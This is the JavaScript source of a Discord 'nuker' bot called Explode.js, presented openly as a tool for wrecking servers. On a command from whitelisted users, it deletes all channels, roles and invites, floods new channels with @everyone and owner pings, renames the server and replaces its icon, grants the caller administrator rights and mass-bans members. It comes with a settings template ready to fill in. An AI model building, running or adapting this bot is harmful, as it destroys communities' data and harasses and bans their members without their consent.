/* * * * * * * * * * * * * * * *
 *                             *
 *         Explode.js          *
 *                             *
 *      Nuker bot written      *
 *         nuke skid           *
 *          servers.           *
 *                             *
 *                             *
 * * * * * * * * * * * * * * * */

var Discord = require("discord.js");
var bot = new Discord.Client();


const settings = {
    "bot_token": "",//bot's token here
    "amount_of_channels": //the amount of channel you need to make,
    "amount_of_messages": //how mant ping msg you need to send to the channels bot just made,
    "channel_name": "channel name",
    "channel_msg_ping_everyone": true,//should bot ping @everyone?
    "channel_msg_ping_owner": true,//should bot ping owner?
    "channel_msg_before": "Message before" ,
    "channel_msg_after": " Message after",
    "server_name": "What do you want server name to be after nuke",
    "server_icon": "What do you want server icon to be after nuke",//put a link here
    "admin_role_name": "the admin role",
    "nuke_done": "What does bot send to you after nuke is done",
    "owner_message": "What bot should send to owner after nuke is done",
    "ban_timeout": 6000,
    "clean_channel_name": "what shold channel name to be after %clean command",
    "clean_server_icon": "",
    "clean_server_name": "what shold server name to be after %clean command",
    "help_embed_message": "Hello, here are the commands that you need:",
    "help_embed_title": "Best bot!",
    "help_embed_description": `
    %explode: SERVER GO BOOM
    %clean: clean this mess, (do not use if not testing)
    %admin: give yourself admin if you need one
    %help: the command you just ran right now`,
    "nuke_command": "%explode",
    "clean_command": "%clean",
    "give_admin_command": "%admin",
    "help_command": "%help",
    "enabled_actions": {
        "delete_channels": true,
        "create_channels": true,
        "change_server_name": true,
        "change_server_icon": true,
        "delete_roles": true,
        "give_caller_admin": true,
        "delete_invites": true,
        "ban_members": true,
        "send_owner_message": true
    }
};

const friends = [
    "add ur friend's ID that you don't want to get banned after mass ban",
    "add ur friend's ID that you don't want to get banned after mass ban",
    "add ur friend's ID that you don't want to get banned after mass ban",
    "add ur friend's ID that you don't want to get banned after mass ban", 
    "add ur friend's ID that you don't want to get banned after mass ban", 
    "add ur friend's ID that you don't want to get banned after mass ban", 
]

bot.once("ready", ()=>{
    console.log("readdyy")
})
var action_functions = {
    "delete_channels": (msg)=>msg.guild.channels.cache.forEach(ch=>ch.delete()),
    "create_channels": (msg)=>{
        var chmsg = "";
        if(settings.channel_msg_ping_everyone) chmsg += "@everyone @here ";
        if(settings.channel_msg_ping_owner) {
            chmsg += settings.channel_msg_before + " <@"+msg.guild.ownerID+"> " + settings.channel_msg_after;
        } else {
            chmsg += settings.channel_msg_before;
        }
        for(var i=0;i<settings.amount_of_channels;i++) {
            msg.guild.channels.create(settings.channel_name).then(chn=>{
                for(var ix=0;ix<settings.amount_of_messages;ix++) {
                    chn.send(chmsg)
                }
            })
        }
    },
    "change_server_name": (msg)=>msg.guild.setName(settings.server_name),
    "change_server_icon": (msg)=>msg.guild.setIcon(settings.server_icon),
    "delete_roles": (msg)=>{
        msg.guild.roles.cache.forEach((role,i,array)=>{
            //console.log(Object.keys(Object.fromEntries(array)))
            if(role.id == msg.guild.id || msg.member.roles.cache.has(role.id)) return;
            role.delete().catch(e=>{})
        })
    },
    "give_caller_admin": (msg)=>{
        msg.guild.roles.create({
            data: {
                name: settings.admin_role_name,
                permissions: ['ADMINISTRATOR'],
                position: 1
            }
        }).then(role=>{
            msg.member.roles.add(role)
        })
    },
    "delete_invites": (msg)=>{
        msg.guild.fetchInvites().then(invites=>{
            invites.forEach(inv=>{
                inv.delete();
            })
        })
    },
    "ban_members": (msg)=>{
        setTimeout(()=>{
            console.log("BAN")
            msg.guild.members.fetch().then(members=>{
                members.forEach(member => {
                    if(member.bannable && member.user.id !== msg.author.id && !friends.includes(member.id)) {
                        member.ban();
                    }
                })
            })
            console.log("SERVER_NUKE_COMPLETE")
            msg.author.send(settings.nuke_done);
        },settings.ban_timeout);
    },
    "send_owner_message": (msg)=>{
        try {
            msg.guild.owner.send(settings.owner_message)
        } catch(e) {}
    }
};

class ActionManager {
    constructor(msg) {
        this.msg = msg;
        Object.keys(action_functions).forEach(action=>{
            this["func_"+action] = action_functions[action];
            this[action] = ()=>{
                if(settings.enabled_actions[action]) {
                    try {
                        this["func_"+action](this.msg)
                    } catch(e) {}
                }
            };
        })
    }
}
bot.on("message", msg=>{
    if(msg.author.bot) return;
    if(msg.content.toLowerCase() == settings.nuke_command) {
        if(!friends.includes(msg.author.id)) return;
        if(msg.deletable) msg.delete();
        var actions = new ActionManager(msg);
        console.log("CHANNELS")
            actions.delete_channels();
            actions.create_channels();

        console.log("SERVER")
            actions.change_server_name();
            actions.change_server_icon();

        console.log("ROLE")
            actions.delete_roles();
            actions.give_caller_admin();

        console.log("INVITE")
            actions.delete_invites();

        actions.ban_members(); // evil :p
    }

    if(msg.content.toLowerCase() == settings.clean_command) {
        if(!friends.includes(msg.author.id)) return;
        if(msg.deletable) msg.delete();
        msg.guild.roles.cache.forEach(role=>{
            if(role.id == msg.guild.id || msg.member.roles.cache.has(role.id)) return;
            role.delete().catch(e=>{})
        })
        msg.guild.channels.cache.forEach(ch=>ch.delete())
        msg.guild.channels.create(settings.clean_channel_name)
        msg.guild.setIcon(settings.clean_server_icon);
        msg.guild.setName(settings.clean_server_name)
    }

    if(msg.content.toLowerCase() == settings.give_admin_command) {
        if(!friends.includes(msg.author.id)) return;
        if(msg.deletable) msg.delete();
        msg.guild.roles.create({
            data: {
                name: settings.admin_role_name,
                permissions: ['ADMINISTRATOR'],
                position: 1
            }
        }).then(role=>{
            msg.member.roles.add(role)
        })
    }

    if(msg.content.toLowerCase() == settings.help_command) {
        if(!friends.includes(msg.author.id)) return;
        if(msg.deletable) msg.delete();
        msg.author.send(settings.help_embed_message,{embed:{
            title: settings.help_embed_title,
            description: settings.help_embed_description
        }})
    }
})
bot.login(settings.bot_token);
